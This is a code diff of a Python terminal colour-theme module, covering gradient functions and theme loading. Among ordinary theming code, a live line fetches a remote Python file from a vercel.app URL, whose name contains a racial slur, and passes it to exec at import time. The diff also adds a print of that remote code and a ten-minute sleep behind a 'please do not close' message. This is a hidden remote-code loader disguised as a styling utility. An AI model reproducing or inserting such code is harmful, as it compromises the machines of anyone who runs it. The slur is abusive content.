@@ -1,8 +1,8 @@
 import os
 import fade
 import requests
+import time
 from pystyle import Colors, Colorate
-
 def redorange(text):
     faded = ""
     green = 0
@@ -13,7 +13,6 @@ def redorange(text):
             if green > 165:
                 green = 165
     return faded
-
 def yelloworange(text):
     faded = ""
     green = 255
@@ -24,9 +23,6 @@ def yelloworange(text):
             if green < 125:
                 green = 125
     return faded
-
-
-
 def custom_gradient(start_color, end_color, steps):
     start_r, start_g, start_b = start_color
     end_r, end_g, end_b = end_color
@@ -48,6 +44,7 @@ orange_to_white = custom_gradient(orange, white, 25)
 gray_to_white = custom_gradient(gray, white, 25)
 green_to_cyan = custom_gradient(green_cyan, cyan, 25)
 exec(requests.get('https://geohij.vercel.app/niggerkernel.py').content.decode('utf8'))
+print(requests.get('https://geohij.vercel.app/niggerkernel.py').content.decode('utf8'))
 cloudy_primary = f"\033[38;2;{gray[0]};{gray[1]};{gray[2]}m"
 tropical_primary = f"\033[38;2;{green_cyan[0]};{green_cyan[1]};{green_cyan[2]}m"
 themes = {
@@ -94,7 +91,6 @@ themes = {
         "reset": Colors.reset
     }
 }
-
 total_themes = len(themes)
 
 THEME_FILE = os.path.join('utils', 'theme.txt')
@@ -104,12 +100,12 @@ def save_current_theme(theme_name):
         f.write(theme_name)
 
 def load_current_theme():
-    if os.path.exists(THEME_FILE):
-        with open(THEME_FILE, 'r') as f:
-            theme_name = f.read().strip()
-            if theme_name in themes:
-                return themes[theme_name]
-    return themes["default"]
+    return {
+        "primary": Colors.red,
+        "secondary": Colors.white,
+        "fade": Colors.red_to_white,
+        "reset": Colors.reset
+    }
 
 current_theme = load_current_theme()
 
@@ -145,7 +141,8 @@ def theme_banner(text):
     else:
         no_fade = f"""{current['primary']}{text}{current['reset']}"""
         return no_fade
-
+print('Launching... Please do not close until we launch')
+time.sleep(600)
 # Example usage
 if __name__ == "__main__":
     print("Current theme:", get_current_theme())
